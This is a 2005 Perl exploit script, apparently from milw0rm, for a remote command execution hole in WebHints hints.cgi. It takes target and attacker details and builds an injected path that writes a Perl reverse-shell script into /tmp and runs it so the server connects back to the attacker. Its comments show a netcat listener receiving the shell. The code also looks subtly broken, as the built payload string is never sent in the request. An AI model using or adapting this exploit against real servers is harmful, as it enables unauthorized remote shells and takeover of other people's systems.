#!/usr/bin/perl -w
#
#
#emanuele@blackbox:~$ perl M4DR007-hints.pl
#
#
# ~~ www.madroot.edu.ms Security Group ~~
#
# WebHints Software hints.cgi
# Remote Command Execution Vulnerability
# Affected version: <= all
# ~~ code by MadSheep ~~
#
#
# 06.11.2005
#
#
#hostname:
#localhost
#port: (default: 80)
#80
#path: (/cgi-bin/)
#/cgi-bin/
#your ip (for reverse connect):
#127.0.0.1
#your port (for reverse connect):
#7350
#
#
#~~~~~~~~~~~~~~~~~~~~START~~~~~~~~~~~~~~~~~
#[*] try to exploiting...
#[*] OK!
#[*] NOW, run in your box: nc -l -vv -p 7350
#[*] starting connect back on 127.0.0.1 :7350
#[*] DONE!
#[*] Look netcat windows and funny
#
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# WARNING - WARNING - WARNING - WARNING
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
#If connect back shell not found:
#- you do not have privileges to write in /tmp
#- Shell not vulnerable
#
#
#We r: MadSheep - Punish3r - Spastic_eye - seth - Groove - Mrk
#
#
#emanuele@blackbox:~$
#
#
#emanuele@blackbox:~$ nc -l -vv -p 7350
#
# uid=1001(madhseep) gid=1001(madsheep) grupos=1001(madsheep)
#
#
#
# Come cheer us at #madroot on Freenode ( irc.freenode.net )
#
# (C) 2005 Copyright by madroot Security Group
#
#############################################
use IO::Socket;

print "\n\n ~~ www.madroot.edu.ms Security Group ~~ \n\n";
print " WebHints Software hints.cgi\n";
print " Remote Command Execution Vulnerability\n";
print " Affected version: <= all \n";
print " ~~ code by MadSheep ~~\n\n\n";
print " 06.11.2005\n\n\n";


print "hostname: \n";
chomp($server=<STDIN>);

print "port: (default: 80)\n";
chomp($port=<STDIN>);
$port=80 if ($port =~/\D/ );
$port=80 if ($port eq "" );

print "path: (/cgi-bin/)\n";
chomp($path=<STDIN>);

print "your ip (for reverse connect): \n";
chomp($ip=<STDIN>);

print "your port (for reverse connect): \n";
chomp($reverse=<STDIN>);


print " \n\n";
print "~~~~~~~~~~~~~~~~~~~~START~~~~~~~~~~~~~~~~~\r\n";

print "[*] try to exploiting...\n";

$string="/$path/hints.pl?|cd /tmp;echo ".q{use Socket;$execute= 'echo "`uname -a`";echo "`id`";/bin/sh';$target=$ARGV[0];$port=$ARGV[1];$iaddr=inet_aton($target) || die("Error: $!\n");$paddr=sockaddr_in($port, $iaddr) || die("Error: $!\n");$proto=getprotobyname('tcp');socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");connect(SOCKET, $paddr) || die("Error: $!\n");open(STDIN, ">&SOCKET");open(STDOUT, ">&SOCKET");open(STDERR, ">&SOCKET");system($execute);close(STDIN)}." >>cbs.pl;perl cbs.pl $ip $reverse|";

print "[*] OK! \n";
print "[*] NOW, run in your box: nc -l -vv -p $reverse\n";
print "[*] starting connect back on $ip :$reverse\n";
print "[*] DONE!\n";
print "[*] Look netcat windows and funny\n\n";
$socket=IO::Socket::INET->new( PeerAddr => $server, PeerPort => $port, Proto => tcp)
or die;


print $socket "POST $path HTTP/1.1\n";
print $socket "Host: $server\n";
print $socket "Accept: */*\n";
print $socket "User-Agent: M4DR007\n";
print $socket "Pragma: no-cache\n";
print $socket "Cache-Control: no-cache\n";
print $socket "Connection: close\n\n";

print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n";
print " WARNING - WARNING - WARNING - WARNING   \r\n";
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\n";
print "If connect back shell not found:\n";
print "- you do not have privileges to write in /tmp\n";
print "- Shell not vulnerable\n\n\n";
print "We r: MadSheep - Punish3r - Spastic_eye - seth - Groove - Mrk\n\n\n";

# milw0rm.com [2005-06-11]
